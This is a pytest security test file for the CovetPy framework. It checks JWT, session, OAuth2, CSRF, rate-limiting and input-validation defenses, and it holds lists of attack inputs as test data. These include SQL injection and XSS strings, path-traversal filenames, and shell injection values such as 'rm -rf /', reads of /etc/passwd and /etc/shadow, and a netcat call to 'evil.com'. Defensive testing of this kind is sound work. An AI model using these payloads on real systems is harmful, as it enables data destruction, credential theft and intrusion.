"""
Comprehensive Security Tests for CovetPy Framework

These tests validate security implementations against REAL authentication systems,
actual vulnerability patterns, and production-grade security threats. All tests
use real security validations, not mocks, to ensure production readiness.

CRITICAL: These tests validate real security implementations including:
- Authentication bypass attempts
- SQL injection vulnerabilities
- XSS attack vectors
- CSRF protection mechanisms
- JWT token security
- Rate limiting enforcement
- Input validation security
"""

import time
import uuid
from datetime import datetime, timedelta
from urllib.parse import quote

import jwt
import pytest

from covet.security import (
    CSRFProtection,
    InputValidator,
    JWTAuthenticator,
    OAuth2Handler,
    PasswordHasher,
    RateLimiter,
    SessionManager,
)
from covet.testing import SecurityTestHelper


@pytest.mark.security
@pytest.mark.real_backend
class TestAuthenticationSecurity:
    """Test authentication security with real systems."""

    @pytest.fixture
    def jwt_secret(self):
        """Real JWT secret for testing."""
        return "test_jwt_secret_key_for_security_testing_only"

    @pytest.fixture
    def jwt_authenticator(self, jwt_secret):
        """Real JWT authenticator instance."""
        return JWTAuthenticator(
            secret_key=jwt_secret,
            algorithm="HS256",
            access_token_expire_minutes=30,
            refresh_token_expire_days=7,
        )

    async def test_jwt_token_security_validation(
        self, jwt_authenticator, security_helper: SecurityTestHelper
    ):
        """Test JWT token security against real attack vectors."""
        # Create valid token
        payload = {
            "sub": "123",
            "username": "testuser",
            "exp": datetime.utcnow() + timedelta(hours=1),
            "iat": datetime.utcnow(),
        }

        valid_token = jwt_authenticator.create_access_token(payload)

        # Test 1: Valid token should work
        decoded = jwt_authenticator.verify_token(valid_token)
        assert decoded["sub"] == "123"
        assert decoded["username"] == "testuser"

        # Test 2: Expired token should fail
        expired_payload = {
            "sub": "123",
            "username": "testuser",
            "exp": datetime.utcnow() - timedelta(hours=1),
            "iat": datetime.utcnow() - timedelta(hours=2),
        }

        expired_token = jwt.encode(
            expired_payload, jwt_authenticator.secret_key, algorithm="HS256"
        )

        with pytest.raises(Exception) as exc_info:
            jwt_authenticator.verify_token(expired_token)
        assert "expired" in str(exc_info.value).lower()

        # Test 3: Tampered token should fail
        tampered_token = valid_token[:-10] + "tampered123"

        with pytest.raises(Exception) as exc_info:
            jwt_authenticator.verify_token(tampered_token)
        assert (
            "signature" in str(exc_info.value).lower()
            or "invalid" in str(exc_info.value).lower()
        )

        # Test 4: Wrong algorithm attack (algorithm confusion)
        malicious_payload = {
            "sub": "123",
            "username": "hacker",
            "exp": datetime.utcnow() + timedelta(hours=1),
            "iat": datetime.utcnow(),
        }

        # Try to use 'none' algorithm
        malicious_token = jwt.encode(malicious_payload, "", algorithm="none")

        with pytest.raises(Exception):
            jwt_authenticator.verify_token(malicious_token)

        # Test 5: Wrong secret key
        wrong_secret_token = jwt.encode(payload, "wrong_secret", algorithm="HS256")

        with pytest.raises(Exception) as exc_info:
            jwt_authenticator.verify_token(wrong_secret_token)
        assert (
            "signature" in str(exc_info.value).lower()
            or "invalid" in str(exc_info.value).lower()
        )

    async def test_password_security_validation(self):
        """Test password hashing and validation security."""
        password_hasher = PasswordHasher(algorithm="bcrypt", rounds=12, salt_rounds=10)

        # Test strong password hashing
        strong_password = "StrongP@ssw0rd123!"
        hashed = password_hasher.hash_password(strong_password)

        # Verify hash properties
        assert hashed != strong_password  # Should be hashed
        assert len(hashed) > 50  # BCrypt hashes are long
        assert hashed.startswith("$2b$")  # BCrypt format

        # Verify password validation
        assert password_hasher.verify_password(strong_password, hashed) is True
        assert password_hasher.verify_password("wrong_password", hashed) is False

        # Test timing attack resistance
        start_times = []
        end_times = []

        # Test with correct password
        for _ in range(10):
            start = time.perf_counter()
            password_hasher.verify_password(strong_password, hashed)
            end = time.perf_counter()
            start_times.append(start)
            end_times.append(end)

        correct_times = [end - start for start, end in zip(start_times, end_times)]

        # Test with incorrect password
        start_times = []
        end_times = []

        for _ in range(10):
            start = time.perf_counter()
            password_hasher.verify_password("wrong_password", hashed)
            end = time.perf_counter()
            start_times.append(start)
            end_times.append(end)

        incorrect_times = [end - start for start, end in zip(start_times, end_times)]

        # Timing should be similar (constant time)
        avg_correct = sum(correct_times) / len(correct_times)
        avg_incorrect = sum(incorrect_times) / len(incorrect_times)

        # Should not have significant timing difference
        timing_diff_ratio = abs(avg_correct - avg_incorrect) / max(
            avg_correct, avg_incorrect
        )
        assert (
            timing_diff_ratio < 0.5
        ), f"Timing attack possible: {timing_diff_ratio:.2%} difference"

    async def test_session_security_validation(self):
        """Test session management security."""
        session_manager = SessionManager(
            secret_key="session_secret_key_for_testing",
            secure_cookies=True,
            httponly_cookies=True,
            samesite="Strict",
            session_timeout_minutes=30,
        )

        # Create secure session
        session_data = {
            "user_id": 123,
            "username": "testuser",
            "roles": ["user"],
            "created_at": datetime.utcnow().isoformat(),
        }

        session_id = session_manager.create_session(session_data)

        # Verify session properties
        assert len(session_id) >= 32  # Should be long random string
        assert session_id.isalnum() or set(session_id) <= set(
            "0123456789abcdefABCDEF"
        )  # Hex or base64

        # Verify session retrieval
        retrieved_data = session_manager.get_session(session_id)
        assert retrieved_data["user_id"] == 123
        assert retrieved_data["username"] == "testuser"

        # Test session expiration
        # Create expired session
        expired_session_data = session_data.copy()
        expired_session_data["created_at"] = (
            datetime.utcnow() - timedelta(hours=2)
        ).isoformat()

        expired_session_id = session_manager.create_session(expired_session_data)

        # Should return None for expired session
        expired_data = session_manager.get_session(expired_session_id)
        assert expired_data is None

        # Test session invalidation
        session_manager.invalidate_session(session_id)
        invalidated_data = session_manager.get_session(session_id)
        assert invalidated_data is None

    async def test_oauth2_security_validation(self):
        """Test OAuth2 implementation security."""
        oauth2_handler = OAuth2Handler(
            client_id="test_client_id",
            client_secret="test_client_secret",
            redirect_uri="https://app.example.com/callback",
            scope=["read", "write"],
            state_secret="oauth2_state_secret",
        )

        # Test authorization URL generation
        auth_url, state = oauth2_handler.get_authorization_url()

        # Verify security properties
        assert "response_type=code" in auth_url
        assert "client_id=test_client_id" in auth_url
        assert "state=" in auth_url
        assert len(state) >= 32  # State should be cryptographically random

        # Test state validation (CSRF protection)
        valid_state = oauth2_handler.validate_state(state)
        assert valid_state is True

        invalid_state = oauth2_handler.validate_state("invalid_state_123")
        assert invalid_state is False

        # Test PKCE (Proof Key for Code Exchange) if supported
        code_verifier, code_challenge = oauth2_handler.generate_pkce_challenge()

        if code_verifier:  # If PKCE is implemented
            assert len(code_verifier) >= 43  # RFC requirement
            assert len(code_challenge) >= 43

            # Verify code challenge
            verified = oauth2_handler.verify_pkce_challenge(
                code_verifier, code_challenge
            )
            assert verified is True


@pytest.mark.security
@pytest.mark.real_backend
class TestInjectionVulnerabilities:
    """Test protection against injection attacks."""

    async def test_sql_injection_protection(
        self, vulnerable_app, security_helper: SecurityTestHelper, http_client
    ):
        """Test SQL injection protection with real attack vectors."""
        # Test basic SQL injection attempts
        injection_payloads = [
            "1' OR '1'='1",
            "1'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users --",
            "'; INSERT INTO users (username) VALUES ('hacked'); --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "1' OR 1=1 LIMIT 1 OFFSET 1 --",
        ]

        for payload in injection_payloads:
            # Test vulnerable endpoint
            response = await http_client.get(
                f"/vulnerable/sql?user_id={quote(payload)}"
            )

            # Should handle injection safely
            assert response.status_code in [200, 400, 422]  # Not 500 (server error)

            # Should not contain SQL error messages
            response_text = response.text.lower()
            sql_error_indicators = [
                "syntax error",
                "mysql_",
                "ora-",
                "postgresql",
                "sqlite",
                "sql syntax",
                "database error",
            ]

            for indicator in sql_error_indicators:
                assert indicator not in response_text, f"SQL error leaked: {indicator}"

        # Record vulnerability test results
        security_helper.vulnerability_reports.append(
            {
                "type": "sql_injection",
                "endpoint": "/vulnerable/sql",
                "payloads_tested": len(injection_payloads),
                "vulnerabilities_found": 0,  # Should be 0 if protected
                "timestamp": datetime.utcnow().isoformat(),
            }
        )

    async def test_xss_protection(
        self, vulnerable_app, security_helper: SecurityTestHelper, http_client
    ):
        """Test XSS protection with real attack vectors."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "\"><script>alert('XSS')</script>",
            "'+alert('XSS')+'",
        ]

        reflected_payloads = []

        for payload in xss_payloads:
            # Test vulnerable endpoint
            response = await http_client.get(f"/vulnerable/xss?input={quote(payload)}")

            # Check if payload is reflected without proper escaping
            response_text = response.text

            if payload in response_text:
                reflected_payloads.append(payload)
            else:
                # Check for properly escaped versions
                escaped_indicators = ["&lt;", "&gt;", "&amp;", "&#x", "\\u003c"]
                is_escaped = any(
                    indicator in response_text for indicator in escaped_indicators
                )
                assert is_escaped, f"XSS payload not properly escaped: {payload}"

        # Record XSS test results
        security_helper.vulnerability_reports.append(
            {
                "type": "xss",
                "endpoint": "/vulnerable/xss",
                "payloads_tested": len(xss_payloads),
                "reflected_payloads": len(reflected_payloads),
                "severity": "high" if reflected_payloads else "low",
                "timestamp": datetime.utcnow().isoformat(),
            }
        )

        # Should have no unescaped reflections
        assert (
            len(reflected_payloads) == 0
        ), f"XSS vulnerabilities found: {reflected_payloads}"

    async def test_command_injection_protection(self, http_client):
        """Test command injection protection."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; rm -rf /",
            "$(cat /etc/shadow)",
            "`id`",
            "; ping -c 1 evil.com",
            "| nc evil.com 1337",
        ]

        for payload in command_payloads:
            # Test endpoint that might process system commands
            response = await http_client.post("/api/process", json={"command": payload})

            # Should reject dangerous commands
            assert response.status_code in [400, 422, 403]
            response_text = response.text.lower()

            # Should not contain command output
            command_indicators = ["root:", "bin/", "etc/", "passwd:", "shadow:"]
            for indicator in command_indicators:
                assert indicator not in response_text

    async def test_ldap_injection_protection(self, http_client):
        """Test LDAP injection protection."""
        ldap_payloads = [
            "*)(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
            "*)|(objectClass=*",
            "*)(cn=*",
        ]

        for payload in ldap_payloads:
            response = await http_client.post(
                "/api/ldap-search", json={"filter": payload}
            )

            # Should handle LDAP injection safely
            assert response.status_code in [200, 400, 422]

            # Should not leak LDAP structure
            response_text = response.text.lower()
            ldap_indicators = ["objectclass", "distinguishedname", "cn="]

            for indicator in ldap_indicators:
                if indicator in response_text:
                    # If LDAP terms present, ensure they're in error messages, not data
                    assert "error" in response_text or "invalid" in response_text


@pytest.mark.security
@pytest.mark.real_backend
class TestCSRFProtection:
    """Test Cross-Site Request Forgery protection."""

    @pytest.fixture
    def csrf_protection(self):
        return CSRFProtection(
            secret_key="csrf_secret_key_for_testing",
            token_field_name="csrf_token",
            header_name="X-CSRF-Token",
            cookie_name="csrftoken",
            exempt_paths=["/api/public/*"],
        )

    async def test_csrf_token_generation_and_validation(self, csrf_protection):
        """Test CSRF token generation and validation."""
        # Generate CSRF token
        token = csrf_protection.generate_token()

        # Verify token properties
        assert len(token) >= 32  # Should be cryptographically strong
        assert token.replace("-", "").replace("_", "").isalnum()  # URL-safe characters

        # Validate token
        is_valid = csrf_protection.validate_token(token)
        assert is_valid is True

        # Invalid token should fail
        invalid_token = "invalid_token_123"
        is_invalid = csrf_protection.validate_token(invalid_token)
        assert is_invalid is False

        # Expired token should fail (if time-based)
        # Note: This test assumes time-based tokens
        time.sleep(0.001)  # Small delay
        if hasattr(csrf_protection, "token_timeout_seconds"):
            # Test with very short timeout
            csrf_short = CSRFProtection(
                secret_key="csrf_secret_key_for_testing", token_timeout_seconds=1
            )
            short_token = csrf_short.generate_token()
            time.sleep(2)  # Wait for expiration

            is_expired = csrf_short.validate_token(short_token)
            assert is_expired is False

    async def test_csrf_protection_middleware(self, csrf_protection, http_client):
        """Test CSRF protection in middleware."""
        # Test GET request (should pass without CSRF token)
        response = await http_client.get("/api/data")
        assert response.status_code != 403  # Should not be blocked

        # Test POST without CSRF token (should be blocked)
        response = await http_client.post("/api/data", json={"test": "data"})
        assert response.status_code == 403
        assert "csrf" in response.text.lower()

        # Test POST with valid CSRF token (should pass)
        token = csrf_protection.generate_token()

        response = await http_client.post(
            "/api/data", json={"test": "data"}, headers={"X-CSRF-Token": token}
        )
        assert response.status_code != 403

        # Test exempt paths
        response = await http_client.post(
            "/api/public/webhook", json={"webhook": "data"}
        )
        assert response.status_code != 403  # Should be exempt

    async def test_csrf_double_submit_cookie_pattern(self, csrf_protection):
        """Test double-submit cookie CSRF protection pattern."""
        # Generate token for cookie
        cookie_token = csrf_protection.generate_token()

        # Same token should be valid for double-submit
        is_valid = csrf_protection.validate_double_submit(cookie_token, cookie_token)
        assert is_valid is True

        # Different tokens should fail
        header_token = csrf_protection.generate_token()
        is_invalid = csrf_protection.validate_double_submit(cookie_token, header_token)
        assert is_invalid is False

        # Empty values should fail
        is_empty = csrf_protection.validate_double_submit("", "")
        assert is_empty is False


@pytest.mark.security
@pytest.mark.real_backend
class TestRateLimitingSecurity:
    """Test rate limiting security implementations."""

    async def test_rate_limiting_enforcement(self, http_client):
        """Test rate limiting enforcement against abuse."""
        # Configure aggressive rate limiting for testing
        endpoint = "/api/rate-limited"

        # Make requests rapidly
        responses = []
        for _i in range(10):
            response = await http_client.get(endpoint)
            responses.append(response)

            if response.status_code == 429:  # Rate limited
                break

        # Should eventually be rate limited
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        assert len(rate_limited_responses) > 0, "Rate limiting not enforced"

        # Check rate limiting headers
        rate_limited_response = rate_limited_responses[0]
        assert "X-RateLimit-Limit" in rate_limited_response.headers
        assert "X-RateLimit-Remaining" in rate_limited_response.headers
        assert "Retry-After" in rate_limited_response.headers

    async def test_rate_limiting_bypass_attempts(self, http_client):
        """Test attempts to bypass rate limiting."""
        endpoint = "/api/rate-limited"

        # Test IP spoofing attempts
        spoofing_headers = [
            {"X-Forwarded-For": "1.2.3.4"},
            {"X-Real-IP": "5.6.7.8"},
            {"X-Originating-IP": "9.10.11.12"},
            {"X-Remote-IP": "13.14.15.16"},
            {"X-Client-IP": "17.18.19.20"},
        ]

        for headers in spoofing_headers:
            # Make requests with spoofed IPs
            for _ in range(15):  # Exceed rate limit
                response = await http_client.get(endpoint, headers=headers)

                if response.status_code == 429:
                    break

            # Should still be rate limited despite spoofing attempts
            assert (
                response.status_code == 429
            ), f"Rate limiting bypassed with headers: {headers}"

    async def test_distributed_rate_limiting(self, http_client):
        """Test distributed rate limiting consistency."""
        # This test would require multiple instances or Redis backend
        # For now, test that rate limiting persists across requests

        endpoint = "/api/rate-limited"
        client_id = str(uuid.uuid4())

        # Make requests with client identifier
        rate_limited_count = 0

        for _i in range(20):
            response = await http_client.get(
                endpoint, headers={"X-Client-ID": client_id}
            )

            if response.status_code == 429:
                rate_limited_count += 1

        # Should consistently enforce rate limits
        assert rate_limited_count > 0, "Distributed rate limiting not enforced"


@pytest.mark.security
@pytest.mark.real_backend
class TestInputValidationSecurity:
    """Test input validation security implementations."""

    @pytest.fixture
    def input_validator(self):
        return InputValidator(
            max_string_length=1000,
            max_array_length=100,
            max_object_depth=10,
            allow_html=False,
            sanitize_sql=True,
        )

    async def test_input_length_validation(self, input_validator):
        """Test input length validation."""
        # Valid input should pass
        valid_input = "a" * 500
        result = input_validator.validate_string(valid_input)
        assert result.is_valid is True

        # Oversized input should fail
        oversized_input = "a" * 2000
        result = input_validator.validate_string(oversized_input)
        assert result.is_valid is False
        assert "length" in result.error_message.lower()

    async def test_html_sanitization(self, input_validator):
        """Test HTML sanitization."""
        malicious_html_inputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<<script>alert('XSS')</script>",
            "<svg><script>alert('XSS')</script></svg>",
        ]

        for malicious_input in malicious_html_inputs:
            result = input_validator.sanitize_html(malicious_input)

            # Should remove or escape dangerous elements
            assert "<script>" not in result.sanitized_value
            assert "javascript:" not in result.sanitized_value
            assert "onerror=" not in result.sanitized_value

    async def test_sql_injection_sanitization(self, input_validator):
        """Test SQL injection sanitization."""
        sql_injection_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM users",
            "'; INSERT INTO",
            "1; DELETE FROM users WHERE",
        ]

        for malicious_input in sql_injection_inputs:
            result = input_validator.sanitize_sql(malicious_input)

            # Should escape or remove SQL injection patterns
            dangerous_patterns = ["';", "DROP TABLE", "UNION SELECT", "DELETE FROM"]

            for pattern in dangerous_patterns:
                assert pattern.lower() not in result.sanitized_value.lower()

    async def test_json_depth_validation(self, input_validator):
        """Test JSON depth validation."""
        # Valid depth should pass
        valid_json = {"level1": {"level2": {"level3": "value"}}}
        result = input_validator.validate_json_depth(valid_json)
        assert result.is_valid is True

        # Excessive depth should fail
        deep_json = {"level1": {}}
        current = deep_json["level1"]

        for i in range(2, 20):  # Create very deep nesting
            current[f"level{i}"] = {}
            current = current[f"level{i}"]

        result = input_validator.validate_json_depth(deep_json)
        assert result.is_valid is False
        assert "depth" in result.error_message.lower()

    async def test_file_upload_validation(self, input_validator):
        """Test file upload validation."""
        # Valid file should pass
        valid_file_data = {
            "filename": "document.pdf",
            "content_type": "application/pdf",
            "size": 1024 * 1024,  # 1MB
            "content": b"PDF content here",
        }

        result = input_validator.validate_file_upload(valid_file_data)
        assert result.is_valid is True

        # Malicious filename should fail
        malicious_files = [
            {
                "filename": "../../../etc/passwd",
                "content_type": "text/plain",
                "size": 100,
            },
            {
                "filename": "script.exe",
                "content_type": "application/octet-stream",
                "size": 100,
            },
            {"filename": "file.php", "content_type": "application/x-php", "size": 100},
            {"filename": "shell.jsp", "content_type": "application/java", "size": 100},
        ]

        for malicious_file in malicious_files:
            result = input_validator.validate_file_upload(malicious_file)
            assert result.is_valid is False

    async def test_unicode_normalization_security(self, input_validator):
        """Test Unicode normalization security."""
        # Test Unicode normalization attacks
        unicode_attacks = [
            "admin\u200badmin",  # Zero-width space
            "admin\u2028admin",  # Line separator
            "admin\ufeffadmin",  # Byte order mark
            "admin\u00a0admin",  # Non-breaking space
        ]

        for attack_input in unicode_attacks:
            result = input_validator.normalize_unicode(attack_input)

            # Should normalize to safe representation
            assert len(result.normalized_value) <= len(attack_input)
            assert "\u200b" not in result.normalized_value  # Zero-width space removed


@pytest.mark.security
@pytest.mark.performance
class TestSecurityPerformance:
    """Test security implementation performance."""

    async def test_password_hashing_performance(self):
        """Test password hashing performance."""
        password_hasher = PasswordHasher(algorithm="bcrypt", rounds=12)

        passwords = [f"password_{i}" for i in range(10)]

        # Measure hashing performance
        start_time = time.perf_counter()

        hashes = []
        for password in passwords:
            hash_value = password_hasher.hash_password(password)
            hashes.append(hash_value)

        end_time = time.perf_counter()
        avg_hash_time = (end_time - start_time) / len(passwords)

        # BCrypt should be slow by design (but not too slow)
        assert (
            0.01 < avg_hash_time < 1.0
        ), f"Password hashing performance: {avg_hash_time:.3f}s"

        # Measure verification performance
        start_time = time.perf_counter()

        for password, hash_value in zip(passwords, hashes):
            is_valid = password_hasher.verify_password(password, hash_value)
            assert is_valid is True

        end_time = time.perf_counter()
        avg_verify_time = (end_time - start_time) / len(passwords)

        # Verification should be similar to hashing time
        assert avg_verify_time < avg_hash_time * 1.5, "Password verification too slow"

    async def test_jwt_processing_performance(self):
        """Test JWT token processing performance."""
        jwt_authenticator = JWTAuthenticator(
            secret_key="performance_test_secret", algorithm="HS256"
        )

        payload = {
            "sub": "123",
            "username": "testuser",
            "roles": ["user", "admin"],
            "exp": datetime.utcnow() + timedelta(hours=1),
        }

        # Measure token creation performance
        start_time = time.perf_counter()

        tokens = []
        for i in range(1000):
            test_payload = payload.copy()
            test_payload["sub"] = str(i)
            token = jwt_authenticator.create_access_token(test_payload)
            tokens.append(token)

        end_time = time.perf_counter()
        avg_create_time = (end_time - start_time) / 1000

        # JWT creation should be fast
        assert avg_create_time < 0.001, f"JWT creation too slow: {avg_create_time:.4f}s"

        # Measure token verification performance
        start_time = time.perf_counter()

        for token in tokens:
            decoded = jwt_authenticator.verify_token(token)
            assert decoded["username"] == "testuser"

        end_time = time.perf_counter()
        avg_verify_time = (end_time - start_time) / 1000

        # JWT verification should be fast
        assert (
            avg_verify_time < 0.002
        ), f"JWT verification too slow: {avg_verify_time:.4f}s"

    async def test_rate_limiting_performance(self):
        """Test rate limiting performance."""
        rate_limiter = RateLimiter(
            max_requests=1000,
            window_seconds=60,
            storage_backend="memory",  # For performance testing
        )

        # Measure rate limit check performance
        start_time = time.perf_counter()

        for i in range(1000):
            client_id = f"client_{i % 100}"  # 100 unique clients
            is_allowed = rate_limiter.is_request_allowed(client_id)
            assert is_allowed is True  # Should be within limit

        end_time = time.perf_counter()
        avg_check_time = (end_time - start_time) / 1000

        # Rate limiting should be very fast
        assert avg_check_time < 0.0005, f"Rate limiting too slow: {avg_check_time:.5f}s"
